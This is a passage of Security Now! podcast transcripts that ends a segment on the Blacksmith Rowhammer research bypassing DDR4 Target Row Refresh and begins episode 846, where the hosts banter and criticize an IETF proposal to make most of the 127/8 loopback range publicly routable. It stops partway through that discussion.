"Rowhammer," they say, "is a vulnerability caused by leaking charges in DRAM cells that enables attackers to induce bit flips in DRAM memory.  To stop Rowhammer, DRAM implements a mitigation known as TRR (Target Row Refresh).  Our previous work showed that the new n-sided patterns can still trigger bit flips on 31% of today's PC-DDR4 devices.  We propose a new, highly effective approach for crafting non-uniform, frequency-based Rowhammer access patterns that can bypass TRR from standard PCs.  We implement these patterns in our Rowhammer fuzzer named Blacksmith and show that it can bypass Target Row Refresh mitigations on 100% of the PC-DDR4 DRAM devices in our test pool."  They had 40.  "Further, our work provides new insights on the deployed mitigations."



So how did they do it?  They conducted a series of experiments beginning with the observation that all of the previously used Rowhammer attacks used uniform patterns such as single-sided, double-sided, and n-sided attacks.  The patterns were uniform in both pattern and in number.  So this made them curious about DRAM's sensitivity to non-uniform attack patterns.  Since the search space of non-uniform attack patterns is huge, they conducted a series of experiments to determine the structure of patterns that effectively bypass the Target Row Refresh mitigations; and they discovered that the order, regularity, and intensity of accessing aggressor rows - "aggressor rows" is the term now of art in Rowhammer attacks of rows that you read in order to cause your target row to get itself confused.  So again, the order, regularity, and intensity of accessing aggressor rows in non-uniform patterns form an essential component of successful attacks.



They noted that their observations matched well-known parameters within the frequency domain, namely frequency, phase, and amplitude.  So they used those frequency domain patterns to design frequency-based Rowhammer patterns that can effectively explore the space of non-uniform attack patterns.  They implemented these patterns in their black-box fuzzer, which they named "Blacksmith."  Blacksmith is able to determine suitable parameter values for any specific targeted device.  So essentially it uses fuzz-based attacks to learn about a specific DRAM's sensitivities.



Okay.  So how powerful and practical are the resulting attacks?  They wrote:  "For our evaluation we considered a test pool of 40 DDR4 devices covering three major manufacturers - Samsung, Micron, and SK Hynix - including four devices that did not report their manufacturer.  We let our Blacksmith fuzzer run for 12 hours to assess its capability to find effective patterns.  Thereafter we swept the best pattern, based on the number of total bit flips triggered, over a contiguous memory area of 256MB, and reported the number of bit flips caused.  The results were that our Blacksmith fuzzer is able to trigger bit flips on all 40 DRAM devices with a large number of bit flips, especially on devices of manufacturers which they anonymized as A and D from their research.



"We also evaluated the exploitability of these bit flips based on three attacks from previous work:  an attack targeting the page frame number of a page table entry to pivot it to an attacker-controlled page table page."  Now, that's one of the things we talked about in the past, remember, that if you could arrange to flip a single control bit on a page table from read-only to read-write, the jig's up.  You know, the OS absolutely depends upon its page tables being protected.  All you have to do is flip that bit, and you have a massive attack.  Also they did an attack on the RSA-2048 public key that allows recovering the associated private key to authenticate an SSH host successfully, and an attack on the password verification logic of the sudoers.so library that enables gaining root privileges.  All attacks were successful.



They said:  "Our work confirms that the DRAM vendors' claims about Rowhammer protections are false and lure you into a false sense of security.  All currently deployed mitigations are insufficient to fully protect against Rowhammer attacks.  Our novel patterns show that attackers can more easily exploit systems than was previously known."



Okay, so their work has been assigned a CVE number 2021-42114.  And their paper, titled "Blacksmith:  Scalable Rowhammering in the Frequency Domain" will be presented during the 43rd IEEE Symposium on Security and Privacy.  I have a link to their 19-page PDF research in the show notes for anyone who's interested.  And they assembled an FAQ to ask and answer some top-of-mind questions.  First they asked:  "Are there any DIMMs that are safe?"  The answer:  "We did not find any DIMMs that are completely safe.  According to our data, some DIMMs" - are more dim.  "Some DIMMs are more vulnerable to our new Rowhammer patterns than others.



"Which implications do these new results have" - or, well, they meant what implications - "do these new results have for me?"  And answer:  "Triggering bit flips has become more easy on current DDR4 devices, which facilitates attacks.  As DRAM devices in the wild cannot be updated, they will remain vulnerable for their service life.



"How can I check whether my DRAM is vulnerable?"  And this is interesting.  "The code for our Blacksmith Rowhammer fuzzer, which you can use to assess your DRAM device for bit flips, is available on GitHub.  We also have an early FPGA version of Blacksmith, and we're working with Google to fully integrate it into an open-source FPGA Rowhammer testing platform."  That would be, okay, several things cool there.  First of all, anybody who wants to compile their Rowhammer fuzzer from GitHub can.  And I will make the following offer.  If anyone does, I'd like to know.  I imagine you have to boot a system.  I don't know what OS platform this thing's hosted on because you'd want access to all of memory.  But maybe they just satisfy themselves with running within, you know, like allocating as much memory as they can and then pounding away on that.  We'll see.



The FPGA is interesting.  That's a Field Programmable Gate Array, which means that it would be possible to create a piece of hardware into which you plug a questionable DRAM or any DRAM and press a button, and it goes to town fuzzing that DRAM in order to determine how vulnerable it is.  Because there wasn't room for it in the show notes, but in their paper they show their results across all 40 of their tested DRAMs, their DDR4 DRAMs.  And it is the case that some had four bit flips; some had 400 million bit flips.



In other words, there's a massive range of vulnerability, obviously by manufacturer.  Some manufacturers are having a higher bit flip rate than others.  And also by DRAMs within a manufacturer, probably within a production batch.  I mean, it's based on the marginal-ness of the actual silicon that these things are being printed onto.  So I expect we're going to be hearing a little bit more about all this in the future.  



They ask:  "Why hasn't JEDEC fixed this issue yet?"  And they answer:  "A very good question.  By now we know, thanks to a better understanding, that solving Rowhammer is hard, but not impossible.  We believe that there's a lot of bureaucracy involved inside JEDEC that makes it very difficult."  So, "What if I have ECC-capable DIMMs?"  They answer:  "Previous work showed that due to the large number of bit flips in current DDR4 devices, error connection will not provide complete selection against Rowhammer, but makes exploitation more difficult."  And we did talk about it in the past about the fact that you can bypass ECC by flipping a pair of bits rather than just one.



They ask:  "What if my system runs with double refresh rate?"  They answer:  "Besides an increased performance overhead and power consumption, previous work showed that doubling the refresh rate is a weak solution not providing complete protection."  They ask:  "Why did you anonymize the name of the memory vendors?"  They said:  "We were forced to anonymize the DRAM vendors for our evaluation.  If you are a researcher, please get in touch with us to receive more information."  And, finally:  "Does Blacksmith work on DIMMs from other vendors?"  And they answer:  "According to statistics, the three DRAM chip manufacturers considered by us cover 94% of the DRAM market.  However, we have tested Blacksmith on three DRAM devices from another vendor, and we could successfully trigger bit flips on these devices, as well."



So this is not a story that has a happy ending or anything that we can update or patch, or even hope for a patch in December.  But it is critically important research for the industry.  We all understand that today's security is porous.  And we've never before been in a climate that's placing more pressure against our porous security boundaries than we are now.  Bad guys are going to weaponize this research.  That's clear.  That's what they do.  The problem, as has been observed, is that the world is already filled with DDR3, very vulnerable, and DDR4, still vulnerable, DRAM, all of which has now been shown to be very much more vulnerable than we believed before, and indeed to be practically vulnerable, that is, these are not theoretical.  You can actually get up to some mischief with this.  So the consequences of these bit flipping attacks are serious.



And as I said, there's been talk of an FPGA, which would be very cool because it would create some hardware.  But we know that there is a range of existing vulnerability from "not so much" to "very."  So, you know, if there was a practical solution for qualifying the vulnerability of DRAM, that's certainly not going to make the vendors very happy.  But you can imagine people over-ordering, you know, get 12 when you need eight, and select the eight that are the least vulnerable and return the 12 because you didn't mean to order them in the first place.  Return the four, I meant, that are the most vulnerable.  Of course that creates a pool of higher vulnerability DRAM that other people will be purchasing.  So there's no good solution.



Anyway, I think I'm curious enough to go take a little peek over in GitHub and see what's there.  I'm not going to spend any time on it.  SpinRite is all I'm doing right now, folks.  But anyway, we've got a lot of other listeners who are obviously very talented and interested in security.  So if any one of our listeners does something with the research on GitHub, definitely let me know.  I'd like to know, and I'd like to share your results with everybody else here.



LEO:  Yeah, cool.  I guess, I don't know, if it's typical by brand, or if it's just that particular stick.  I don't know.  We'll see.  Maybe a lot of people do it, yeah.  That concludes this edition, the Blacksmith edition of Security Now!.  Steve Gibson is at GRC.com.  That's the place to go for the world's finest mass storage maintenance and recovery utility, SpinRite, currently 6.0; 6.1 is coming.  And you can participate in the development, plus get a free copy when the upgrade comes, if you go right now and buy 6.0 at GRC.com.



You'll also find there 16Kb audio for this show, if you are bandwidth impaired; of course the full 64Kb, as well.  And it's the only place you can get the transcripts which Steve commissions, and thank you for doing that, and thanks to Elaine Farris for writing those.  GRC.com.  Lots of other free stuff there, as well, worth checking out.  And you can leave him feedback there at GRC.com/feedback.  Steve's DMs are also open on Twitter, @SGgrc.  So you can ask a question or send him a Picture of the Week there.



We have a copy of the show, both audio and video, at our website, TWiT.tv/sn.  We also have a YouTube channel dedicated to Security Now! so you can watch it there.  Of course you can subscribe in your favorite podcast client.  That way you'll get it automatically the minute it's available.  Those who want to watch us do it live.  And there are people, believe it or not - talking to you, Grayson - who are listening live.  And they do that at TWiT.tv/live.  There's audio and video there.  Chat live at irc.twit.tv or in our Club TWiT Discord.  All of that is just for you.  We thank you so much to our Club TWiT members for making it possible, and of course to all of you for listening.  And most important, thanks to Steve Gibson.  Have a great week, Steve.  We'll see you next time on Security Now!. 



STEVE:  Thanks, buddy.



Copyright (c) 2021 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#846

DATE:		November 23, 2021

TITLE:		HTTP REQUEST SMUGGLING 

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-846.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  We're going to start off this week by taking a careful look at a shocking proposal being made by the Internet's Engineering Task Force, the IETF.  They're proposing a change to a fundamental and long-standing aspect of the Internet's routing which I think must be doomed to fail.  So we'll spend a bit of time on this in case it might actually happen.  Then Microsoft reveals some results from their network of honeypots, and we update on the progress, or lack of, toward more secure passwords.  GoDaddy suffers another major intrusion, and just about every Netgear router really does now need to receive a critical update for the fifth time this year.  This one is very worrisome.



Then we're going to finish by winding up our propeller beanie caps to explore the emerging threat represented by HTTP Request Smuggling, which everyone will understand by the time we're done.  It's a sneaky way of slipping sensitive and damaging web requests past perimeter defenses.  Oh, and on this November 23rd, a special Happy Birthday wish to Evan Katz, a long-time friend and follower of this podcast.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  Wow, a very bad plan from the IETF.  It's just a proposal right now, but Steve wants to nip it in the bud.  And you know what, you're going to agree.  We'll take a look at Netgear routers again.  Another zero-day, a mess.  And then look at the status of brute-forcing passwords.  What are the worst passwords, the most brute forced?  The answer will not surprise you.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 846, recorded Tuesday, November 23rd, 2021:  HTTP Request Smuggling.



It's time for Security Now!.  Yes, you've been waiting all week long, you're a very patient person, for this guy right here, Steve Gibson.  Hello, Steve.  Happy Thanksgiving week.



STEVE GIBSON:  Yo, happy, yes.  Indeed.  And I missed your birthday.  Was it actually on Sunday?



LEO:  No, it's Friday.



STEVE:  Oh, last Friday?



LEO:  This Friday.  You didn't miss it.



STEVE:  Oh.  Oh, well, in that case...



LEO:  Send gifts care of TWiT, 1351B Redwood Way.  No, I don't  like gifts, as you know.  Once you get to a certain age, you don't even want to think about it.



STEVE:  Well, I was put in mind because this is Evan Katz's birthday today.



LEO:  Oh, dear friend, yeah.



STEVE:  And of course you and I both know Evan.  He's a prolific communicator.  And he...



LEO:  That's a nice way to put it.



STEVE:  And he tweeted, the reason I know it's his birthday, I don't track his birthday, but he said, he tweeted that it was 10 years ago today that I surprised him at the Ritz Carlton in Dana Point.  His wife set this up.  And his wife's name is Ruth.  And so Ruth contacted me, and she said it would just blow Evan's mind if he walked into the parlor at the Ritz Carlton and had you there to hang out with him.  So I said, oh, what the heck.



LEO:  Aw, that's very sweet of her.



STEVE:  Let's meet.



LEO:  How nice of you, too.



STEVE:  It was very cool, yeah.  And it turns out he's a big chess buff.



LEO:  I know, I know.



STEVE:  It was from Evan that I learned that humans just - it's over for us.



LEO:  It's over.  Not even close.  Not even close.  But the human world championship is starting Friday.  So that's always fun.



STEVE:  On your birthday.



LEO:  On my birthday.  They did it just for me.  



STEVE:  Oh, there you go.



LEO:  Magnus Carlsen, the Norwegian...



STEVE:  Current champion?



LEO:  Yeah, current Norwegian world champion will face Nepomniachtchi.  Nepo, they call him, because his name is ridiculous.



STEVE:  Well, I was just recommending "Queen's Gambit" to someone who has never seen it.



LEO:  Oh, is that good.  Oh, that's good TV.



STEVE:  I just can't wait to - oh, oh, it's so good.



LEO:  Really good show.



STEVE:  So we have an interesting episode, sort of weighted at each end as opposed to just at the end.  We're going to start off this week by taking a careful look.  Oh, I should mention that this Security Now! Episode 846 for, what is this, three days before your birthday, November 23rd?  



LEO:  Well, if you want to - yeah.  Actually my birthday, I am wrong.  I lied.  My birthday's the 29th.  I don't know what I was thinking.  Michael's birthday is Friday.  Mine is a week, is coming up.  A week, next week. 



STEVE:  Yeah, next Monday.



LEO:  Next Monday.



STEVE:  All right.  Anyway, there's a lot of birthdays happening.



LEO:  Yeah, I got confused.



STEVE:  We're going to be talking about HTTP Request Smuggling, which was going to be last week's topic until it got bumped for something sort of more timely.  But I did mention it because it was part of an attack chain which I thought was going to be tied into the topic of the week.  But now it's tied into this topic, this week's topic.  Anyway, HTTP Request Smuggling a very tricky way of smuggling HTTP Requests across the border, literally.  So that one's going to be kind of tricky, but I think really interesting for our technically inclined listeners.



We're going to start off, though, by taking a careful look at a shocking proposal being made by the Internet's Engineering Task Force, the IETF.  They're proposing a change to a fundamental and longstanding aspect of the Internet's routing, which I think is doomed to fail.  So we're going to spend a bit of time on this in case it might actually happen, which will surprise me.  But so that's first.  Then Microsoft reveals some results from their network of honeypots, and we update on the progress or, sadly, lack of, toward more secure passwords.



GoDaddy suffers a major, another, I think it's like the fifth, major intrusion in recent years.  And just about every Netgear router really does now, as of now, need to receive a critical update.  This is the fifth bad problem they've had this year.  This one's very worrisome because it's so easy to exploit.  So anybody with a Netgear router pay attention.  We're going to finish, as I said, by winding up our propeller beanie caps to explore the emerging threat represented by HTTP Request Smuggling, which I'm pretty sure, although it's a little tricky, I think everyone's going to understand this by the time we're done.  And even if you kind of get kind of a feel for it, it's still, it's very cool the way it works.  And unfortunately, it's of importance because it allows sensitive and damaging web requests to sneak or be smuggled past perimeter defenses.  So I think a really good podcast for everybody.  And you and I were talking about our Picture of the Week.  We've got a...



LEO:  It's a funny one.



STEVE:  This is a great one, yeah.



LEO:  Yeah, and I think HTTP Request Smuggling will be a great topic of conversation this year at Thanksgiving dinner tables all over the country.



STEVE:  Yeah, cocktail party, like what's new?



LEO:  Yeah, great thing you can bring up and show your brains.  Then don't forget to tell people you heard it on Security Now!.  That's important.



STEVE:  So our Picture of the Week.



LEO:  I love it.  I love it.



STEVE:  Shows, I'm not sure, maybe there's drugs behind there because there's sort of a medical theme to this.  It's going to be difficult for me to describe.  I would recommend that people get the show notes if you don't - if you're curious.  Now, are those forceps or sutures, those...



LEO:  I think they're forceps, yeah.  They're like scissors with a point that you can clamp.



STEVE:  Correct.  Well, and then down at the back where your finger loops are is a ratchet, so you're able to close them and then, like, lock them closed.  So, okay.  So people have seen like surgical scissors, right, forceps.  The problem that this enterprising individual solved was how to lock a cabinet that had two handles where there was, like, an air gap underneath the handle.  Like so in order to open this cabinet you'd slip your fingers under the handle and then pull it towards you.  Well, this cabinet is not locking, yet clearly they need to lock it.  Well, they have a padlock, but padlock is the standard size padlock with a hasp of the normal size.  It won't straddle these two handles which are on opposite sides or on opposite doors to this cabinet.



So the person opened these forceps, slid one of the handles through the middle of the forceps between the finger loops, then locked the forceps, which brought the loops, the two loops of the forceps close enough to the other handle that they were able to open the padlock, run it through both loops of the forceps, thus keeping them closed and locked, and through the other handle, and then locked the padlock.  So basically the forceps sort of form an extension of this padlock.  Anyway, it's extremely clever.  And, you know, you can imagine sort of like an intellectual puzzle, if someone said here's what you've got to work with; you know?  You've got a crayon, and you've got forceps, and you've got a padlock.  And your job, your goal here is to lock this cabinet.  It's like, okay.  How many people are going to figure that out?  I'm not sure.  Anyway.



LEO:  Thanks, by the way, to Encrypted Beard in our IRC, who says he sent that to you.



STEVE:  Oh, yes, indeed.  Thank you.



LEO:  Yeah, yeah.



STEVE:  Okay.  So this effort or this idea, this scheme from the  IETF, well, I titled this "An Idea Whose Time Has Passed."  Okay, now, I've got to create some background here for everyone who isn't, like, really tuned up on Internet IP addresses and protocols and things.  As we know, there are several ranges of IPv4 addresses that are formally designated as unroutable.  Three ranges of addresses were originally specified and set aside by RFC 1918, and that's almost when that one was published.  Oh, actually no, it was in '96, 1996.  The smallest of these three unroutable networks or address ranges is the one which most consumer routers use for their default local LAN.  And I'm sure most people are familiar with that, right, 192.168, and then often dot 0 or dot 1.  Consequently, any IPv4 address beginning with 192.168 is considered to be part of a local private network, and no public routers will forward packets addressed to those IPs anywhere.



Okay.  In the case of 192.168 dot whatever dot whatever, this creates a nice block of 64,000 IPs because you know, each of those numbers is a byte.  So we've got two bytes.  So that's 16 bits, and so that's 64K IPs.



LEO:  And 10-dot's unroutable, as well; right?



STEVE:  Well, correct.  So that's the small one.  The middle size one, which RFC 1918 reserved, was 172.16 dot anything dot anything through 172.31 dot anything dot anything.  Now, so that provides a network having 20 bits.  The 20 least significant bits of those IPs are reserved for specifying the machine within that network.  So that's one million machines.  And the third and largest is the one you mentioned, Leo, is 10-dot.  So that's anything beginning with 10 dot anything anything anything.  So that gives us 24 bits for specifying a specific machine, and so 24 bits is 16 million machines on the local network.  So those are super ample for non-routable IP ranges.  And as we know, for quite some time there were so many IPv4 IPs that some were never allocated.



Back when we first were using and talking about and fans of the Hamachi virtual network system, it was cleverly using the 5-dot network since no one ever had.  5-dot had never been allocated.  So it wasn't like reserved.  It just no one ever got around to needing it.  And so the guy who did it was super clever.  He said, hey, you know, I can't use the RFC 1918 networks like 10-dot because people might want to use Hamachi on a 10-dot network.  And so the network we use for Hamachi has to be disjoint.  It has to be completely separate.  But it can't be any public routable IP or things wouldn't ever be able to get to Hamachi anyway.  So clever that he thought to use 5-dot.  And of course it got allocated some time ago because, as we know, with time, IPv4 space has become depleted.  And, you know, someone looked over and said, hey, there's 16 million IPs that begin with 5 that no one's ever used.  Let's start handing them out.  And so they're all gone now.



Okay.  So another set-aside block of IPv4 space are all those addresses beginning with 127.  Anyone who's spent much time poking around with IP networking on any IP-enabled operating system will have encountered the concept of the local loopback IP, or really the loopback network of which one IP is most often used.  By universal convention and explicit specification, 127.0.0.1 always refers to the local machine, like the machine you're at.  It has an IP of 127.0.0.1 and whatever other IP like from the LAN or WAN or whatever.  So you can kind of think of 127.0.0.1 as an alias for the local machine's IP.  If you ping 127.0.0.1 on any machine that you're at, that you're in front of, while any portion of your local network is running, that pinging is guaranteed to succeed if the local net stack is up because it causes the machine to essentially ping itself.  No packets go anywhere.  And this is used for all kinds of purposes.



Many developers running a local web or some other server on a machine will bind that server's IP to some port on 127.0.0.1, like 127.0.0.1:80, for example, for web services.  And that makes that bound server's services available to any client running on that machine.  So, for example, you could put into your web browser 127.0.0.1.  And if there was something bound on port 80 or 443, you would get the page that that web server was displaying.  So that's the story. 



Now, although only 127.0.0.1 is typically used, the entire 127-dot network of 16 million IPs has been set aside as a local loopback network.  And in fact, if you open a Windows command prompt and enter the command "route print," or, you know, Linux, you can print the routing table in Linux or Unix or macOS, any Internet-based operating system has its own local routing table.  And in the show notes I've got the result on my typing "route print."  And you have a couple entries for the local machine's actual IP, but in the table I see 127.0.0.0 with a netmask of 255.0.0.0, meaning that that entire network is recognized and will be routed to the interface 127.0.0.1.  In other words, this routing table in the machine I'm sitting in front of has allocated the entire 127-dot network for its own local use.  And that's 16 million IPs; right?  Because it's got all of the lower 24 bits are available underneath the 127.



So on page 31 of the RFC that set this up - it's RFC 1122, dated way back even before the 1918, this one is from 1989, RFC 1122 - page 31 of that RFC very clearly states 127 and then any, you know, any bits, and it says "internal host loopback address.  Addresses of this form MUST NOT" - and, you know, this is in the formal RFC language, so all capitals "MUST," all capitals "NOT" - "appear outside a host."  And that explains why I did a serious double-take, and I really did check the date to be certain it didn't say April 1st when last week I encountered an official IETF Standards Track proposal titled "Unicast Use of the Formerly Reserved 127/8."



Okay.  So Unicast is the formal name just for standard packets, for example, as opposed to broadcast or multicast.  You know, Unicast is what everything is mostly except for when they're not.  You know, so all the packets we talk about going places, those are Unicast packets.  They're sent to a specific address.  So this thing says Unicast use of the formerly reserved - formerly reserved - 127/8 network is what it's saying.  So this pending IETF proposal is suggesting that the definition of the 127-dot class A network should be changed to allow most of its 127-dot space to be publicly routable in order to provide nearly 16 million more IPv4 addresses.



So, okay, the abstract for this insanity, it's very short.  It says:  "This document redefines the IPv4 local loopback network as consisting only of the 64K" - actually it says 65,536 - "addresses 127.0.0.0 to 127.0.255.255."  In other words, in networking notation, you know, netmask notation, 127.0.0.0/16.  "It asks implementers" - which, you know, is everyone - "to make addresses in the prior loopback range 127.1.0.0 through 127.255.255.255 fully usable for Unicast use on the Internet."  Okay, now, in other words, the routing table in everyone's computer is now wrong.  It won't work.  It's broken.  It won't send any packets beginning with 127 anywhere.  But the IETF, and this not April Fools, they're saying, yeah, we changed our mind.  And we'd like to have those addresses back, please.



Okay.  So since I think this is so interesting...



LEO:  Oh, my god.  This is a nightmare.



STEVE:  ...and I'm sure - Leo.  It's, oh, okay.  Well, okay.  Since I'm sure that any of this podcast's listeners who are aware of Internet engineering, as you obviously are, Leo, are currently picking themselves up off the floor, I'm going to share a few more of the good bits from the proposal.  So, like, what?



So introduction.  They say:  "With ever-increasing pressure to conserve IP space on the Internet" - ahem, IPv6 - "it makes sense to consider where relatively minor changes" - okay.  First of all, relatively minor, okay - "changes can be made can be made to fielded practice to improve numbering efficiency.  One such change proposed by this document is to allow the Unicast use of more than 16 million historically" - okay, and it is more because it's like 16 million, 700 and something or other, so yeah, more than 16 million - "historically reserved addresses in the middle of the IPv4 address space.  This document provides history and rationale to reduce the size of the IPv4 local loopback network" - and they have in parens ("localnet") - "from a /8 to a /16, freeing up over 16 million IPv4 addresses for other possible uses."



They said:  "When all of 127.0.0.0/8 was reserved for loopback addressing, IPv4 addresses were not yet recognized as scarce.  Today, there is no justification" - and I agree with him on this point - "there is no justification for allowing 1/256th of all IPv4 addresses for this purpose, when only one of these addresses [127.0.0.1] is commonly used, and only a handful are regularly used at all.  Unreserving the majority of these addresses provides a large number of additional IPv4 host addresses for possible use, alleviating some of the pressure of IPv4 address exhaustion."



So because I think this is so interesting, they said:  "Background.  The IPv4 network 127/8 was first reserved by Jon Postel in 1981 under RFC 0776.  Postel's policy was to reserve the first and last network of each class, and it does not appear that he had a specific plan for how to use 127/8.  Apparently, the first operating systems to support a loopback interface as we understand it today were experimental Berkeley Unix releases by Bill Joy and Sam Leffler at the University of California Berkeley.



The choice of 127.0.0.1 as loopback address was made in 1983 by Joy and Leffler in the code base that was eventually released as 4.2 BSD.  Their earliest experimental code bases used 254.0.0.0 and 127.0.0.0 as loopback addresses.  Three years later, Postel and Joyce Reynolds documented the loopback function in November of 1986 in RFC 0990, and it was codified as a requirement for all Internet hosts three years after that, in RFC, the one I mentioned first, 1122.



"The substantive interpretation of these addresses has remained unchanged since RFC 0990 indicated that the network number 127" - that is, the entire network 127 - "is assigned the loopback function, that is, a datagram sent by a higher level protocol to a network 127 address" - meaning any IP beginning with 127-dot - "should loop back inside the host.  No datagram 'sent'" - and they had that in quotes because - "to a network 127 address should ever appear on any network anywhere.  Many decisions about IPv4 addressing contemporaneous with this one underscore the lack of concern about address scarcity.  It was common in the early 1980s to allocate an entire /8 to an individual university, a company, a government agency, or even a research project."  After all, no one's using this crazy Internet.  And we have 256 of those /8 networks.  So, you know, let's just give them out.



"By contrast," they write, "IPv6, despite its vastly larger pool of available address space, allocates only a single local loopback address (::1)," and that's defined in RFC 4291.  "This appears," they write, "to be an architectural vote of confidence in the idea that Internet protocols ultimately do not require millions of distinct loopback addresses."



LEO:  No, one would do, yeah.



STEVE:  Yeah.  And that's, like, what most people use; right?  127.0.0.1.



LEO:  This is localhost.  This is home sweet home.



STEVE:  That's it.



LEO:  Yeah.



STEVE:  That's right.  They said:  "Most applications use only the single loopback address 127.0.0.1 (localhost) for IPv4 loopback purposes, although there are exceptions.  For example, the systemd-resolved service on Linux provides a stub DNS resolver at 127.0.0.53."



LEO:  Oh, I didn't know that.



STEVE:  Which is kind of cute because port 53 is DNS's port.  So it's like, let's give it 127.0.0.53, probably bound to port 53.  They finish this section:  "In theory, having multiple local loopback addresses might be useful for increasing the number of distinct IPv4 sockets that can be used for inter-process communication within a host.  The local loopback /16 network retained by this document" - that is, remember, so 127.0, we get to keep that, so dot 0 dot anything dot anything, it's 127.1 all the way up to 127.255.  That's what they're proposing removing.  So you get to keep a .16, which means there would be 64K, you know, 65,536 IPs, each that could have a port.  Ports are 16 bits.  So basically you have 32 bits of local connectivity, and that's as we know 4.3 billion.  So that ought to be enough because, again, mostly we're using 127.0.0.1.



And they finish with Section 3 titled Change in Status of Addresses Within 127/8:  "The purpose of this document is to reduce the size of the special-case reservation of 127/8, so that only 127.0/16 is reserved as the local loopback network.  Other IPv4 addresses whose first octet is 127," which is to say 127.1 through 127.255, "are no longer reserved and are now available for general Internet Unicast use, treated identically to other IPv4 addresses and subject to potential future allocation.



"All host and router software SHOULD [in all caps] treat 127.1 through 127.255 as a global Unicast address range.  Clients for auto-configuration mechanisms such as DHCP SHOULD [all caps] accept a lease or assignment of addresses" - because, you know, like, they won't now.  They go, what?  Anyway, "SHOULD accept a lease or assignment of addresses within 127.1 through 127.255 whenever the underlying operating system is capable of accepting it.  Servers for these mechanisms SHOULD assign this address when so configured."



Okay.  Now, in this case I'm not even going to rhetorically ask what could possibly go wrong because the question doesn't need to be asked.  The question is what have these people been smoking?



LEO:  They probably are using one of those old forceps to do it, whatever it was.



STEVE:  Oh, yes.  That way you would smoke it right down to the bitter end.  Okay.  Just think, just think of all the many millions of existing embedded TCP/IP stacks in all the many millions of existing IoT devices that sold and shipped with what has, since the dawn of the Internet, been a default local routing table that will never forward any packet starting with 127.  Just like they said in Section 2.  It's like, yeah, 127 should never appear on any network.  And now they're saying, well, could we change our mind?  No.  You can't change your mind.



You know, every Internet device, every appliance there is has a routing table like Windows in front of me, like everybody has.  Whatever, even your phone, you know, well, that's probably IPv6 from carriers.  But as we know, none of these existing devices will ever be updated or changed.  And what of all the many millions of small office/home office, you know, SOHO routers running embedded Linuxes that will also never be updated and will similarly never forward any packets starting with 127?  You could send one into it, and it would die there because its stack won't forward it.  It won't send it anywhere.  Its stack says anything beginning with 127 goes to the local interface.  That is, it dies when it hits a stack like that.



So what's interesting to me is from a political standpoint the only way to read this is as an extreme desperation move which is really interesting for its own sake, and an appreciation of just how badly no one wants to move to IPv6.  You know, we've had it, what, 20 years?  No.  It's going to be interesting to see what happens to this proposal.  Those of us who see the folly of this are not alone.  I grabbed a sampling.  Here's a sampling of nine tweets from just one thread on Twitter when someone mentioned this upon finding it.



Ben Aveling tweeted:  "Was it a mistake to allocate an entire A class to the loopback range?  Yes, yes it was.  Is it too late to fix that mistake?  Yes, yes it is."



LEO:  Yes, yes it is. 



STEVE:  Rich Mirch tweeted:  "Real products use it.  For example, F5's BIG-IP has several subnets under 127/8.  Loopback is configured as a /24."  And I have a screen shot in the show notes.  It's very dim.  But you can see a 127.2.0.2/24, a 127.1.1.254/24, a 127.20.0.254/16.  The point is, because these have been unusable, people have used them, you know, within a controlled environment like F5's Big 5 products.  They're able to say, hey, you know, we're going to - since it's absolutely impossible to route these, we can use them safely.



Andy90 tweeted:  "TLS 1.2 was around for so long that most middlebox vendors didn't handle handshakes appropriately, thus TLS 1.3 has to masquerade as 1.2."  He said:  "I dread to think how many network tools simply are hardcoded and untested for anything like this and would break routing on the spot."



Jim Kladis tweeted:  "I've seen 127 addresses in backbone hops."  That's sort of what F5 is doing.  He says:  "There's much better waste to go after.  IBM," then he says, "/8.  HPE," of course HP Enterprise, right, "/8.  Xerox /8."  He says:  "Then the tech universities and anything the DoD still has."  And of course we've talked about this before; right?  And he's right.  There are ridiculously large current reservations that are absolutely not in use.



Luca Francesca said:  "If only we had an alternative like, I don't know, IPv6?  I know, I know, bleeding-edge stuff.  It's only 20 years old."



One Matt Among Many tweeted:  "Thinking of the number of firewall rules I've seen, by default, every one of them, which have 'Allow 127/8.'"  He says:  "Please just use IPv6 already."



Pascal Ernster tweeted:  "Before even *considering*" - and he has that in asterisks for emphasis - "embarking on this journey of nonsense, they should reassign a dozen of the 14 /8s that the DoD has.  And when those have been reassigned, continue with the /8s that are currently assigned to Apple, Ford, Prudential, and the United States Postal Service."  He says:  "Heck, I'd even go as far as saying that all /8s should be assigned to regional Internet registries."



Jonathan Katz tweeted:  "Other than security, there is the practicality of this.  I'm sure there is lots of software, legacy and otherwise, out there with 127/8 hard-coded in it which would break badly."  And that includes every operating system we're using today.



And finally, David tweeted:  "Pretty much all operating systems boot up with a 127.0.0.0/8 loopback by default.  Changing that would require updates to software and firmware, or changes to startup scripts.  These newly routable addresses would be inaccessible to many devices.  Who would want them?"  And that really is...



LEO:  Well, that's a good point.  You're freeing up stuff nobody would want anyway.



STEVE:  Yes.  Exactly.



LEO:  That's a really good point.



STEVE:  And nobody, you just couldn't ever know that you were like, you know, you get all set up, and you hook yourself onto the Internet, and why does it go so quiet?  I'm not getting - why am I not getting any - you know, I've got 127.2.0.0, and nothing's coming in.



LEO:  Nobody's going to use it.



STEVE:  And, you know, the points that were made about all the other low-hanging...



LEO:  Right.



STEVE:  .../8 networks I think were really interesting and right on point.  It must be that companies see their legacy allocations as corporate assets.



LEO:  Yup.  Yup.



STEVE:  They must know that they'll never ever have any need for nearly that much space as they currently own.  And what's - I guess it must just be, I mean, for the IETF to be considering this craziness, it just must be that it's like, what is it, impolite to say, you know, Xerox?  Really?  Do you need all that?  16 million IPs?  Really?  Because, like, the world wants them.  And as a matter of fact, IPv4 addresses are currently trading at $36 apiece.  And a 16 million /8 allocation is currently valued at more than half a billion dollars.



LEO:  Wow.  Wow.



STEVE:  So that price has been rising steadily through the years as IPv4 desperation has been increasing.  So you can imagine that corporations are sitting on these things like, hey, you know, this is appreciating faster than bitcoin.



LEO:  Yeah.



